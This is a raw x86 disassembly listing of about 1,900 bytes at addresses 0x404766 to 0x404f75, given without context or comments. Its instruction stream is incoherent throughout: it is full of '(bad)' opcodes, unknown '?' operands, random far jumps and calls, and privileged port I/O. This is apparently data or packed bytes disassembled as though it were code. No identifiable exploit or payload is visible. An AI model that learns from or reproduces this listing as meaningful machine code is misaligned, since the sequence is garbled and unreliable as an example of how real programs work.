  404766:	mov    ch,0xbf
  404768:	cmp    ecx,DWORD PTR [ebx+0x1a]
  40476b:	add    eax,0x5326fb59
  404770:	pop    edx
  404771:	std    
  404772:	jns    0x4046f8
  404774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404775:	add    DWORD PTR [esi+0x66c860e7],edx
  40477b:	jle    0x4047db
  40477d:	and    bh,BYTE PTR [edx]
  40477f:	add    eax,0x94e92695
  404784:	test   eax,0xe25518a4
  404789:	loope  0x40474c
  40478b:	nop
  40478c:	inc    esi
  40478d:	lds    ecx,FWORD PTR [esp+edx*4-0x53bcef34]
  404794:	lods   al,BYTE PTR ds:[esi]
  404795:	add    ebx,DWORD PTR [edi]
  404797:	cmp    DWORD PTR [ebx-0x1b],edi
  40479a:	sar    DWORD PTR [edx+0x55a82f96],cl
  4047a0:	and    BYTE PTR [edi+0x7dd6f57f],al
  4047a6:	mov    DWORD PTR [edi+edi*4+0x2ea7a4a4],ebx
  4047ad:	scas   al,BYTE PTR es:[edi]
  4047ae:	pop    eax
  4047af:	mov    edi,0xea80debf
  4047b4:	dec    ebx
  4047b5:	out    0x41,eax
  4047b7:	clc    
  4047b8:	jmp    0xf498:0x75b0a2b9
  4047bf:	aas    
  4047c0:	sbb    DWORD PTR [ecx+edx*8-0x4efbca23],ecx
  4047c7:	jmp    0x4047fe
  4047c9:	push   ecx
  4047ca:	inc    ecx
  4047cb:	fisttp WORD PTR [eax-0x3767005d]
  4047d1:	add    DWORD PTR [eax-0x504cda2e],esi
  4047d7:	aad    0x90
  4047d9:	xor    dh,BYTE PTR [ecx]
  4047db:	inc    ebx
  4047dc:	icebp  
  4047dd:	repz pop es
  4047df:	jbe    0x404819
  4047e1:	lods   al,BYTE PTR ds:[esi]
  4047e2:	out    dx,eax
  4047e3:	dec    esp
  4047e4:	imul   edx,DWORD PTR [eax],0xffffffe1
  4047e7:	ja     0x4047a7
  4047e9:	mov    ds:0xc9954e17,al
  4047ee:	and    edx,0xa0205ec1
  4047f4:	scas   al,BYTE PTR es:[edi]
  4047f5:	xchg   esi,eax
  4047f6:	outs   dx,DWORD PTR ds:[esi]
  4047f7:	outs   dx,BYTE PTR ds:[esi]
  4047f8:	mov    gs:0x7b34266f,al
  4047fe:	sbb    al,0x67
  404800:	push   0x28dcd1e9
  404805:	add    edi,DWORD PTR [eax+0x24]
  404808:	add    BYTE PTR [ebp+0x7aa921ff],ch
  40480e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40480f:	fs cmp ecx,ecx
  404812:	push   esi
  404813:	pop    ebx
  404814:	ins    DWORD PTR es:[edi],dx
  404815:	sub    DWORD PTR [edx-0x58f86f05],edx
  40481b:	xchg   DWORD PTR [eax-0x6a],ecx
  40481e:	pop    esp
  40481f:	jne    0x40480e
  404821:	idiv   DWORD PTR [ebx+0x1d]
  404824:	fist   DWORD PTR [edi]
  404827:	ficom  WORD PTR [ecx-0x5dad83e5]
  40482d:	icebp  
  40482e:	mov    dh,0x9f
  404830:	call   0xa0b33e92
  404835:	pusha  
  404836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404837:	repnz mov edi,0x6dd5d786
  40483d:	neg    eax
  40483f:	push   0xfffffffd
  404841:	mov    ah,0xa5
  404843:	sahf   
  404844:	pop    ss
  404845:	push   ebx
  404846:	inc    eax
  404847:	repnz mov esp,0x4104353b
  40484d:	out    dx,al
  40484e:	loopne 0x404825
  404850:	iret   
  404851:	or     eax,0xfcbde3fd
  404856:	mov    BYTE PTR [ebp+0x21],cl
  404859:	xor    eax,DWORD PTR [eax+edi*2+0x32]
  40485d:	jecxz  0x40482b
  40485f:	adc    al,0x90
  404861:	adc    BYTE PTR [ebp+0x475d8693],al
  404867:	push   0x47e2975e
  40486c:	scas   eax,DWORD PTR es:[edi]
  40486d:	data16 mov dl,0xde
  404870:	outs   dx,BYTE PTR ds:[esi]
  404871:	(bad)  
  404872:	sbb    ebp,DWORD PTR [eax-0x49]
  404875:	sbb    BYTE PTR [eax],0x37
  404878:	cmc    
  404879:	sbb    ebx,esp
  40487b:	int    0x3f
  40487d:	(bad)  
  40487e:	jns    0x4048f8
  404880:	and    al,0x40
  404882:	nop
  404883:	mov    DWORD PTR [edi],ebx
  404885:	dec    edx
  404886:	fldcw  WORD PTR [edi+0x4d9c5562]
  40488c:	push   ecx
  40488d:	xchg   ecx,eax
  40488e:	sub    esi,DWORD PTR [edx-0x11d1857c]
  404894:	inc    ebx
  404895:	es adc dh,ch
  404898:	cmp    eax,0x5aa3af83
  40489d:	pop    esp
  40489e:	inc    di
  4048a0:	shl    BYTE PTR [eax+0x5b],1
  4048a3:	bound  ecx,QWORD PTR [edx+eiz*4-0xb5460ed]
  4048aa:	jb     0x404929
  4048ac:	inc    esi
  4048ad:	stos   DWORD PTR es:[edi],eax
  4048ae:	int3   
  4048af:	add    DWORD PTR [edx-0x2fdf5b3c],ecx
  4048b5:	outs   dx,BYTE PTR ds:[esi]
  4048b6:	jmp    0x6bdc3d54
  4048bb:	iret   
  4048bc:	jl     0x4048f4
  4048be:	mov    ecx,0x5eea3e9
  4048c3:	mov    cx,0x2460
  4048c7:	aas    
  4048c8:	jno    0x4048e6
  4048ca:	out    0xa8,al
  4048cc:	fstp   TBYTE PTR [eax-0x7a]
  4048cf:	out    0x6e,eax
  4048d1:	push   eax
  4048d2:	lods   eax,DWORD PTR ds:[esi]
  4048d3:	(bad)  
  4048d4:	adc    eax,0x22028e17
  4048d9:	mov    ebx,0x74bd4407
  4048de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048df:	pop    ecx
  4048e0:	call   0x8f03e061
  4048e5:	mul    BYTE PTR [ebx]
  4048e7:	in     eax,dx
  4048e8:	cmc    
  4048e9:	jns    0x4048a1
  4048eb:	sahf   
  4048ec:	add    al,0xca
  4048ee:	jmp    0xb370:0x88f2947b
  4048f5:	call   0xa167:0x970d1adf
  4048fc:	popa   
  4048fd:	or     eax,edx
  4048ff:	push   edi
  404900:	test   DWORD PTR [edi+esi*8+0x11a81998],esp
  404907:	bound  edx,QWORD PTR [esi-0x53]
  40490a:	int    0x3a
  40490c:	in     eax,0x4a
  40490e:	jae    0x4048e7
  404910:	fwait
  404911:	lock sbb eax,esp
  404914:	retf   
  404915:	pushf  
  404916:	mov    BYTE PTR [ebp-0x267f2af8],bh
  40491c:	fisubr DWORD PTR [edi]
  40491e:	std    
  40491f:	inc    ebx
  404920:	out    dx,eax
  404921:	shl    ch,1
  404923:	jns    0x40496f
  404925:	inc    ecx
  404926:	dec    esp
  404927:	lea    esi,[edi]
  404929:	push   esi
  40492a:	push   DWORD PTR [eax]
  40492c:	push   edi
  40492d:	jns    0x4048fe
  40492f:	ds push esp
  404931:	loopne 0x4048fb
  404933:	test   BYTE PTR ds:0x764fc306,ah
  404939:	scas   al,BYTE PTR es:[edi]
  40493a:	dec    ebp
  40493b:	lds    ebp,FWORD PTR [ebx+esi*4+0x5a]
  40493f:	arpl   WORD PTR [ecx],cx
  404941:	std    
  404942:	es pusha 
  404944:	inc    edi
  404945:	jle    0x404903
  404947:	xor    dh,BYTE PTR [edx+eax*8]
  40494a:	iret   
  40494b:	sub    eax,0x73497971
  404950:	iret   
  404951:	xchg   edx,eax
  404952:	mov    ebx,0x27aa6543
  404957:	pop    ecx
  404958:	leave  
  404959:	(bad)  
  40495a:	or     BYTE PTR [eax+0x3a],ah
  40495d:	push   edi
  40495e:	xor    DWORD PTR [ebx+0x37],edi
  404961:	mov    edx,?
  404963:	in     al,0xe3
  404965:	fidivr WORD PTR [esi+0x265a42c9]
  40496b:	push   ebx
  40496c:	jge    0x40496c
  40496e:	inc    ebx
  40496f:	inc    esi
  404970:	add    al,0xea
  404972:	dec    ecx
  404973:	div    DWORD PTR [ebx-0x53]
  404976:	and    ebp,DWORD PTR [esi-0xd2a7207]
  40497c:	push   ss
  40497d:	jge    0x404971
  40497f:	dec    esi
  404980:	cmp    eax,0xfeaf01d4
  404985:	into   
  404986:	ss daa 
  404988:	adc    dh,ch
  40498a:	pop    eax
  40498b:	dec    ebx
  40498c:	cmp    BYTE PTR [edi+eax*8+0x5eb07dbf],bl
  404993:	pop    esp
  404994:	pop    edi
  404995:	sbb    BYTE PTR [eax+0x27395ba6],cl
  40499b:	and    BYTE PTR [edx],bl
  40499d:	cwde   
  40499e:	mul    DWORD PTR [eax]
  4049a0:	push   0x8b97bfb2
  4049a5:	add    cl,BYTE PTR [ebx-0x62323c38]
  4049ab:	repz js 0x404991
  4049ae:	jp     0x404972
  4049b0:	and    BYTE PTR [esp+ebp*4-0x2f],ah
  4049b4:	inc    ebx
  4049b5:	jbe    0x404a08
  4049b7:	cmp    DWORD PTR [esi-0x66d0463a],edi
  4049bd:	clc    
  4049be:	mov    esp,0x775f87f0
  4049c3:	aad    0x67
  4049c5:	xchg   esp,eax
  4049c6:	retf   
  4049c7:	addr16 jle 0x404a42
  4049ca:	call   0x20a0d6d9
  4049cf:	aam    0x25
  4049d1:	sahf   
  4049d2:	data16 jns 0x404a4c
  4049d5:	jno    0x40496b
  4049d7:	jmp    0x9cb4:0x7f7ce2e1
  4049de:	pushf  
  4049df:	jmp    0xbc1c:0x7262f237
  4049e6:	push   0xf95ad8d9
  4049eb:	imul   edx,DWORD PTR [ecx+0x6d],0xffffffdf
  4049ef:	sbb    ecx,DWORD PTR [ebx-0x263b5f64]
  4049f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f6:	out    dx,al
  4049f7:	jecxz  0x4049a8
  4049f9:	icebp  
  4049fa:	retf   0x95d5
  4049fd:	repz sti 
  4049ff:	dec    ebp
  404a00:	daa    
  404a01:	mov    ebp,0xa1031da8
  404a07:	dec    ecx
  404a08:	pushf  
  404a09:	hlt    
  404a0a:	xchg   esi,eax
  404a0b:	inc    eax
  404a0c:	dec    esp
  404a0d:	xchg   ebp,eax
  404a0e:	es inc edi
  404a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a11:	mov    ebx,0x65875021
  404a16:	mov    edx,0x443d16f4
  404a1b:	repnz xchg esp,eax
  404a1d:	adc    BYTE PTR [esi-0x2d],dl
  404a20:	cmp    BYTE PTR [edx],ah
  404a22:	arpl   bx,ax
  404a24:	(bad)  
  404a26:	pop    ebx
  404a27:	cdq    
  404a28:	imul   BYTE PTR [ebp-0x59446841]
  404a2e:	pushf  
  404a2f:	add    BYTE PTR [edx],ah
  404a31:	dec    esp
  404a32:	retf   
  404a33:	sar    BYTE PTR [ebp+0x6603fc80],0x98
  404a3a:	inc    ebp
  404a3b:	xor    dl,BYTE PTR [edx+0xe]
  404a3e:	bound  ecx,QWORD PTR [esi+0x7336aaac]
  404a44:	loopne 0x404a90
  404a46:	mov    eax,ds:0xd20a58bc
  404a4b:	cmp    ebx,eax
  404a4d:	in     eax,dx
  404a4e:	jmp    0x945bed1b
  404a53:	scas   eax,DWORD PTR es:[edi]
  404a54:	mov    esp,0xa6887a93
  404a59:	xchg   ecx,eax
  404a5a:	gs dec ecx
  404a5c:	pop    edi
  404a5d:	fisub  DWORD PTR ds:0x9ffd52e3
  404a63:	(bad)  
  404a65:	(bad)
  404a68:	fild   DWORD PTR [edi+ebp*2-0x53]
  404a6c:	fist   WORD PTR [ecx+eax*1+0x1c]
  404a70:	(bad)  
  404a71:	cmp    BYTE PTR [ebx+0x4305038b],cl
  404a77:	mov    WORD PTR [ebp+0x4e],fs
  404a7a:	loop   0x404a25
  404a7c:	sahf   
  404a7d:	not    BYTE PTR [edi+0x4ff5e5e9]
  404a83:	sub    ebx,edi
  404a85:	mov    esi,0xb36f6d75
  404a8a:	imul   ebp,DWORD PTR [eax+0x8216841],0xafbfbc28
  404a94:	push   ds
  404a95:	add    bl,al
  404a97:	shl    BYTE PTR [esi+0x2d],0x49
  404a9b:	mov    ?,WORD PTR [edi+0x63]
  404a9e:	imul   esi,ecx,0x79
  404aa1:	jno    0x404a51
  404aa3:	inc    eax
  404aa4:	mov    ebx,0xeeabe8d
  404aa9:	xchg   edx,eax
  404aaa:	ins    DWORD PTR es:[edi],dx
  404aab:	xchg   edi,eax
  404aac:	dec    edx
  404aad:	out    dx,eax
  404aae:	mov    edi,0xb51665e8
  404ab3:	sbb    al,0x33
  404ab5:	es fwait
  404ab7:	test   BYTE PTR [edx+0x44],0x16
  404abb:	in     al,dx
  404abc:	and    al,0x99
  404abe:	in     eax,0xc6
  404ac0:	dec    ecx
  404ac1:	dec    ebx
  404ac2:	add    al,0xd6
  404ac5:	inc    edi
  404ac6:	fs iret 
  404ac8:	jge    0x404ae7
  404aca:	xchg   ecx,eax
  404acb:	sbb    eax,0xcde96a76
  404ad0:	push   edi
  404ad1:	sub    DWORD PTR [eax-0x58a6d80d],esp
  404ad7:	in     eax,0x34
  404ad9:	js     0x404afb
  404adb:	push   ebx
  404adc:	dec    ecx
  404add:	fdivr  DWORD PTR [ecx]
  404adf:	jmp    0x8c6bd9b5
  404ae4:	loopne 0x404a87
  404ae6:	mov    WORD PTR [eax-0x4be15845],?
  404aec:	xor    al,0x3c
  404aee:	call   DWORD PTR [ebp+0x1d209418]
  404af4:	adc    BYTE PTR [esi-0x45],bl
  404af7:	cli    
  404af8:	lods   al,BYTE PTR ds:[esi]
  404af9:	and    BYTE PTR [ebx],ch
  404afb:	frstor [esi-0x6a27adfb]
  404b01:	push   ebx
  404b02:	fidiv  WORD PTR [esi+0x1a8d87ac]
  404b08:	pslld  mm6,QWORD PTR [edx-0x7c9c909b]
  404b0f:	cmp    BYTE PTR [ebp+0x69],ch
  404b12:	in     al,dx
  404b13:	inc    ebp
  404b14:	xchg   ecx,eax
  404b15:	and    edi,DWORD PTR [edx-0x1d8009dd]
  404b1b:	xchg   edi,eax
  404b1c:	adc    eax,0xa971c187
  404b21:	das    
  404b22:	ret    0x813d
  404b25:	xor    al,0x4c
  404b27:	xor    DWORD PTR [ecx+0x4ee5eb72],esi
  404b2d:	mov    dl,0x32
  404b2f:	test   DWORD PTR [eax-0x24e51458],0xfe884050
  404b39:	sub    BYTE PTR [edi+ecx*4+0x3b],dh
  404b3d:	or     DWORD PTR [ecx-0x11456aeb],ebp
  404b43:	inc    ebx
  404b44:	push   ebx
  404b45:	mov    al,0xe3
  404b47:	mov    BYTE PTR [eax-0x2],ch
  404b4a:	sub    ebx,edx
  404b4c:	mov    ds:0x71b4f18c,eax
  404b51:	jbe    0x404bb2
  404b53:	stos   DWORD PTR es:[edi],eax
  404b54:	xchg   ecx,eax
  404b55:	and    DWORD PTR [esi+esi*4-0xe],edi
  404b59:	fisub  WORD PTR [edx+esi*2-0x68660018]
  404b60:	mov    cl,0x46
  404b62:	mov    ds:0x575a9243,al
  404b67:	fidivr DWORD PTR [edx]
  404b69:	pop    eax
  404b6a:	(bad)  
  404b6b:	addr16 mov cl,0x84
  404b6e:	stos   DWORD PTR es:[edi],eax
  404b6f:	enter  0x173b,0x51
  404b73:	fwait
  404b74:	xchg   edi,eax
  404b75:	test   al,0x6b
  404b77:	(bad)  
  404b78:	cmp    BYTE PTR [ebx],ah
  404b7a:	adc    bh,bh
  404b7c:	sub    esi,esp
  404b7e:	aaa    
  404b7f:	lahf   
  404b80:	sbb    DWORD PTR [ecx+0x55],edi
  404b83:	repnz inc esi
  404b85:	sub    ah,BYTE PTR [edi+edi*8]
  404b88:	aam    0x81
  404b8a:	(bad)  
  404b8b:	push   0xa28e09bc
  404b90:	mov    ecx,0x2108f6af
  404b95:	fimul  WORD PTR [eax]
  404b97:	shl    DWORD PTR [esi],1
  404b99:	arpl   WORD PTR [ebx-0x92c60a],bx
  404b9f:	pop    ss
  404ba0:	mov    esi,0x50c07d1b
  404ba5:	jne    0x404bc4
  404ba7:	dec    eax
  404ba8:	add    al,BYTE PTR [ebx]
  404baa:	adc    ebx,DWORD PTR [esi+0x1c7aa2a5]
  404bb0:	mov    ah,0x5f
  404bb2:	sub    BYTE PTR [esi-0x9849501],0x5f
  404bb9:	mov    dh,0xb9
  404bbb:	inc    edx
  404bbc:	cmp    al,0x93
  404bbe:	inc    ebx
  404bbf:	mov    WORD PTR es:[ecx+0x7],?
  404bc3:	dec    ebx
  404bc4:	dec    ebp
  404bc5:	push   edi
  404bc6:	or     eax,0x5e20e233
  404bcb:	repnz mov esp,0x19e272e1
  404bd1:	mul    DWORD PTR [ebx+ebx*1+0x51423876]
  404bd8:	shl    BYTE PTR [eax+0xc7575a1],0x34
  404bdf:	xchg   edi,eax
  404be0:	jge    0x404c3d
  404be2:	stc    
  404be3:	frstor [eax]
  404be5:	in     al,0xfb
  404be7:	or     DWORD PTR [esi-0x74],esi
  404bea:	or     eax,0x2c415fff
  404bef:	retf   
  404bf0:	retf   0x3e4d
  404bf3:	std    
  404bf4:	out    0x55,eax
  404bf6:	test   DWORD PTR [edx-0x79],esi
  404bf9:	or     dh,ah
  404bfb:	xchg   edi,eax
  404bfc:	popf   
  404bfd:	pop    esp
  404bfe:	jne    0x404bfd
  404c00:	mov    bl,0x38
  404c02:	es out 0xdf,al
  404c05:	mov    ah,0xcf
  404c07:	xchg   WORD PTR [eax-0x4a],dx
  404c0b:	das    
  404c0c:	push   esp
  404c0d:	lods   al,BYTE PTR ds:[esi]
  404c0e:	fisttp QWORD PTR [edx]
  404c10:	cmp    al,0x84
  404c12:	shr    DWORD PTR [ebx-0x26],1
  404c15:	cwde   
  404c16:	cmp    al,0x6d
  404c18:	inc    edi
  404c19:	int    0xdc
  404c1b:	xlat   BYTE PTR ds:[ebx]
  404c1c:	adc    edx,ebp
  404c1e:	adc    al,0xd0
  404c20:	inc    ebp
  404c21:	dec    ecx
  404c22:	call   0x377a:0x1dbe2ac1
  404c29:	pop    ebp
  404c2a:	call   0xaf63:0x7382c6c5
  404c31:	pop    ds
  404c32:	imul   eax,DWORD PTR [edi-0x214cc900],0x29e8755e
  404c3c:	pop    ebx
  404c3d:	xchg   esp,eax
  404c3e:	mov    edi,0x7d55b860
  404c43:	pop    es
  404c44:	repz sbb DWORD PTR [ebp+0xa],ecx
  404c48:	dec    ebx
  404c49:	sbb    al,0x5a
  404c4b:	aas    
  404c4c:	mov    esp,0xf15fe3e6
  404c51:	xchg   ebp,eax
  404c52:	inc    edi
  404c53:	push   0x7d14464c
  404c58:	pop    es
  404c59:	scas   eax,DWORD PTR es:[edi]
  404c5a:	rcl    ebx,cl
  404c5c:	je     0x404c0e
  404c5e:	push   esi
  404c5f:	sbb    DWORD PTR [ebx-0x61],esp
  404c62:	aad    0x46
  404c64:	mov    al,ds:0xf614df86
  404c69:	or     al,ah
  404c6b:	popf   
  404c6c:	push   edx
  404c6d:	push   esi
  404c6e:	xchg   esi,eax
  404c6f:	pop    edi
  404c70:	mov    esi,0x7f5ef186
  404c75:	dec    ecx
  404c76:	sbb    eax,0xd3241d0f
  404c7b:	into   
  404c7c:	mov    esp,DWORD PTR [edx]
  404c7e:	mov    esp,0xc2b94bbd
  404c83:	sub    al,BYTE PTR [ecx-0x2fd30e8a]
  404c89:	imul   eax,edi,0x3a
  404c8c:	mov    bl,0x49
  404c8e:	pop    ebp
  404c8f:	jbe    0x404d08
  404c91:	(bad)  
  404c92:	jp     0x404c21
  404c94:	repnz xor esi,ecx
  404c97:	adc    ch,ch
  404c99:	fwait
  404c9a:	in     al,dx
  404c9b:	pop    ebx
  404c9c:	gs es aam 0xfb
  404ca0:	xchg   ecx,eax
  404ca1:	das    
  404ca2:	repz repnz inc edx
  404ca5:	add    al,BYTE PTR [ebx]
  404ca7:	mov    esi,0x714bf24e
  404cac:	pop    ebx
  404cad:	out    dx,eax
  404cae:	idiv   BYTE PTR [ebx-0x6025db34]
  404cb4:	or     eax,0x4db426ce
  404cb9:	loopne 0x404d13
  404cbb:	mov    ecx,DWORD PTR [edx+0x34]
  404cbe:	mov    bh,0x2f
  404cc0:	adc    al,0xef
  404cc2:	and    eax,0x4e01da80
  404cc7:	sbb    BYTE PTR [ebx-0x5],0xc3
  404ccb:	sti    
  404ccc:	out    dx,al
  404ccd:	stos   BYTE PTR es:[edi],al
  404cce:	jnp    0x404c59
  404cd0:	bound  esi,QWORD PTR [ecx+0x59]
  404cd3:	aam    0xad
  404cd5:	(bad)  
  404cd6:	mov    cl,0x0
  404cd8:	data16 add BYTE PTR [ebp+0x6a2dd29],al
  404cdf:	call   0x8f6bc90a
  404ce4:	test   DWORD PTR [edx-0x7f46169f],esp
  404cea:	or     ch,ch
  404cec:	shl    BYTE PTR [edi+0x14],1
  404cef:	mov    esp,0x97a9f4b0
  404cf4:	sbb    al,0xaa
  404cf6:	push   0x155458c4
  404cfb:	inc    ebp
  404cfc:	inc    eax
  404cfd:	jge    0x404d28
  404cff:	xchg   esp,eax
  404d00:	cmp    BYTE PTR [edx+0x7fbe3014],cl
  404d06:	loope  0x404d48
  404d08:	pop    ds
  404d09:	mov    dh,0x7c
  404d0b:	ins    DWORD PTR es:[edi],dx
  404d0c:	jl     0x404cb1
  404d0e:	es mov edx,0xf8030c11
  404d14:	fcom   st(4)
  404d16:	jnp    0x404d32
  404d18:	pop    ebp
  404d19:	mov    edi,0xdffd4e49
  404d1e:	ins    DWORD PTR es:[edi],dx
  404d1f:	jnp    0x404d1f
  404d21:	outs   dx,BYTE PTR ds:[esi]
  404d22:	xor    edx,edi
  404d24:	mov    bl,0x90
  404d26:	and    BYTE PTR [ebx],0x13
  404d29:	mov    eax,ds:0x6009a7af
  404d2e:	push   esp
  404d2f:	loop   0x404d3a
  404d31:	cmp    BYTE PTR [ebp-0x1309fa55],bh
  404d37:	mov    bl,0xa1
  404d39:	dec    ebx
  404d3a:	call   0xf3a7:0xf20e98
  404d41:	retf   0xf5bc
  404d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d45:	fist   WORD PTR [edi+0x64]
  404d48:	or     ch,BYTE PTR [edx+0x12]
  404d4b:	adc    BYTE PTR [esi+0x3],ah
  404d4e:	out    0x68,eax
  404d50:	rcr    bh,1
  404d52:	mov    eax,ds:0xe409b6e6
  404d57:	jnp    0x404cee
  404d59:	outs   dx,BYTE PTR ds:[esi]
  404d5a:	push   es
  404d5b:	jle    0x404d44
  404d5d:	call   0x1766d497
  404d62:	mov    ecx,esp
  404d64:	(bad)  
  404d65:	cs cmp eax,0xa897ff50
  404d6b:	aam    0xcd
  404d6d:	cmp    al,0x9
  404d6f:	jns    0x404d4b
  404d71:	mov    BYTE PTR [ecx+ebp*4+0x79],ah
  404d75:	jns    0x404d6a
  404d77:	scas   al,BYTE PTR es:[edi]
  404d78:	xchg   edx,eax
  404d79:	mov    al,ds:0xe15cac06
  404d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7f:	push   ebp
  404d80:	sbb    ebp,DWORD PTR [edi+0x3196c4b4]
  404d86:	icebp  
  404d87:	imul   ebp,DWORD PTR [edi-0x80],0x306ccc2a
  404d8e:	repnz xchg edx,eax
  404d90:	inc    ebp
  404d91:	inc    ecx
  404d92:	mov    ds:0x1cea51c8,eax
  404d97:	sti    
  404d98:	sar    DWORD PTR [ebx],1
  404d9a:	sub    al,0x36
  404d9c:	shl    bl,cl
  404d9e:	pop    eax
  404d9f:	mov    al,0xa7
  404da1:	sete   BYTE PTR [eax-0x45]
  404da5:	jmp    0xb928a0a4
  404daa:	or     DWORD PTR [edi+0x25a80b94],0xffffff80
  404db1:	inc    edi
  404db2:	mov    ebx,0x4165a5f6
  404db7:	test   BYTE PTR [eax],0x2d
  404dba:	xchg   BYTE PTR [edi-0x30ba9c9d],bl
  404dc0:	fcom   QWORD PTR [ecx]
  404dc2:	jp     0x404d69
  404dc4:	mov    dh,0x0
  404dc6:	pop    eax
  404dc7:	cmc    
  404dc8:	inc    ecx
  404dc9:	mov    edx,0x9add657b
  404dce:	cmp    DWORD PTR [edx+ecx*2+0x4c689aa8],esp
  404dd5:	xor    eax,0x70c8781d
  404dda:	adc    ebx,DWORD PTR [ecx-0x4a]
  404ddd:	out    0x81,eax
  404ddf:	imul   eax,DWORD PTR [ecx-0x52fc2538],0x77e510a1
  404de9:	push   ds
  404dea:	cmc    
  404deb:	xor    al,0x2
  404ded:	(bad)  
  404dee:	jns    0x404df1
  404df0:	ja     0x404d98
  404df2:	mov    ch,0xa6
  404df4:	jp     0x404e1d
  404df6:	adc    al,bl
  404df8:	inc    edi
  404df9:	xor    al,0x31
  404dfb:	call   0x94fd3894
  404e00:	dec    edi
  404e01:	lds    edi,FWORD PTR [ebp-0x30]
  404e04:	dec    edi
  404e05:	xchg   edi,eax
  404e06:	inc    eax
  404e07:	cmc    
  404e08:	shl    DWORD PTR [edi],0xbf
  404e0b:	test   DWORD PTR [ebx],esi
  404e0d:	pop    ecx
  404e0e:	ret    
  404e0f:	iret   
  404e10:	cmp    ebx,ebx
  404e12:	cmc    
  404e13:	mov    esi,0x65670a78
  404e18:	in     al,dx
  404e19:	sub    bl,bl
  404e1b:	push   0xe2729bd7
  404e20:	jne    0x404e58
  404e22:	aad    0x5d
  404e24:	cmp    al,0x49
  404e26:	stos   DWORD PTR es:[edi],eax
  404e27:	pusha  
  404e28:	push   esp
  404e29:	xchg   DWORD PTR [eax+esi*2],ecx
  404e2c:	out    0x9d,al
  404e2e:	ror    DWORD PTR [ebx+0x213cd990],1
  404e34:	mov    eax,0x76cc33fb
  404e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e3a:	pop    esi
  404e3b:	pop    edx
  404e3c:	mov    ds:0x94417038,eax
  404e41:	ins    BYTE PTR es:[edi],dx
  404e42:	imul   ecx,DWORD PTR [bx+di],0xfc16e657
  404e49:	fdivp  st(6),st
  404e4b:	bound  edx,QWORD PTR [edx+0x7ad59966]
  404e51:	retf   
  404e52:	call   0x64bc:0xbc15054f
  404e59:	dec    edx
  404e5a:	mov    ds:0xdae67e60,eax
  404e5f:	push   edx
  404e60:	xchg   BYTE PTR [esi-0x7c776088],al
  404e66:	add    eax,0xccb85368
  404e6b:	imul   ecx,DWORD PTR [edx],0x95b467cd
  404e71:	(bad)  
  404e72:	out    0xb,eax
  404e74:	inc    ebp
  404e75:	jae    0x404eb9
  404e77:	xor    cl,bl
  404e79:	adc    eax,0xb6bb312d
  404e7e:	sbb    eax,0x43aa6250
  404e83:	push   ebp
  404e84:	stos   BYTE PTR es:[edi],al
  404e85:	push   ebx
  404e86:	paddd  mm1,QWORD PTR [ebx+0x35a488d6]
  404e8d:	leave  
  404e8e:	mov    dh,0x23
  404e90:	enter  0xc8e2,0xb1
  404e94:	adc    eax,0x5eb632ec
  404e99:	imul   esi,DWORD PTR [ecx+0x1e083012],0x46
  404ea0:	fldenv [ebx+0x47]
  404ea3:	sub    BYTE PTR [ecx-0x3be55cb5],0xd7
  404eaa:	(bad)  
  404eab:	shr    DWORD PTR ds:0xced4d742,1
  404eb1:	xchg   DWORD PTR [edi-0x54],edx
  404eb4:	out    dx,eax
  404eb5:	and    al,0xcc
  404eb7:	add    eax,0xe2cfa186
  404ebc:	xchg   esi,eax
  404ebd:	loope  0x404eb7
  404ebf:	or     al,0xf
  404ec1:	pop    ecx
  404ec2:	addr16 daa 
  404ec4:	mov    WORD PTR [ecx+0x20],ss
  404ec7:	push   edx
  404ec8:	jp     0x404e78
  404eca:	das    
  404ecb:	ror    dl,1
  404ecd:	clc    
  404ece:	inc    edi
  404ecf:	hlt    
  404ed0:	mov    eax,ds:0x54fb476
  404ed5:	push   edi
  404ed6:	push   cs
  404ed7:	and    ecx,edi
  404ed9:	or     ecx,DWORD PTR [esi]
  404edb:	fistp  QWORD PTR [ebp-0x7718b48d]
  404ee1:	xchg   edi,eax
  404ee2:	xor    BYTE PTR [edi-0x78],ch
  404ee5:	mov    esp,0x234e457b
  404eea:	std    
  404eeb:	mov    dl,BYTE PTR [eax+0x6360dea4]
  404ef1:	xor    al,0x4
  404ef3:	pop    ds
  404ef4:	ds and al,0x19
  404ef7:	fnstcw WORD PTR [eax+0x25]
  404efa:	rcl    BYTE PTR [esi+edi*2-0x29f12b7a],1
  404f01:	cmp    ebx,edx
  404f03:	and    BYTE PTR [ebx-0x50],0x6b
  404f07:	or     esi,eax
  404f09:	mov    bl,0xcc
  404f0b:	sbb    BYTE PTR [eax+0x14],al
  404f0e:	mov    esp,0xe1b90451
  404f13:	scas   eax,DWORD PTR es:[edi]
  404f14:	loopne 0x404f23
  404f16:	test   al,0xe1
  404f18:	mov    edi,DWORD PTR [ebp-0x2ac9114a]
  404f1e:	cmp    eax,0xbcb0926d
  404f23:	mov    cl,0xf2
  404f25:	mov    ch,0x4b
  404f27:	sub    ah,al
  404f29:	pop    es
  404f2a:	xchg   esi,eax
  404f2b:	pop    edx
  404f2c:	retf   0x2922
  404f2f:	jge    0x404f6f
  404f31:	out    dx,al
  404f32:	(bad)  
  404f33:	jne    0x404eec
  404f35:	inc    edx
  404f36:	jp     0x404f95
  404f38:	mul    DWORD PTR [edx+0x397e7f80]
  404f3e:	push   ebx
  404f3f:	fimul  WORD PTR [esi-0xd3cef54]
  404f45:	adc    bh,cl
  404f47:	das    
  404f48:	sbb    BYTE PTR [esi+eax*8],ch
  404f4b:	fwait
  404f4c:	jne    0x404f73
  404f4e:	or     DWORD PTR [edi+0xe],ebx
  404f51:	and    BYTE PTR [edi],0x6d
  404f54:	sub    eax,0x65efe447
  404f59:	adc    eax,0x23ae7710
  404f5e:	addr16 adc al,0xb5
  404f61:	pop    esi
  404f62:	test   DWORD PTR [esi-0x497e538a],0x993b658a
  404f6c:	gs jp  0x404f62
  404f6f:	mov    cl,0xf0
  404f71:	fcomp  DWORD PTR [ecx+0x7a]
  404f74:	into   
  404f75:	sub    al,BYTE PTR [edx-0x364ec3f4]
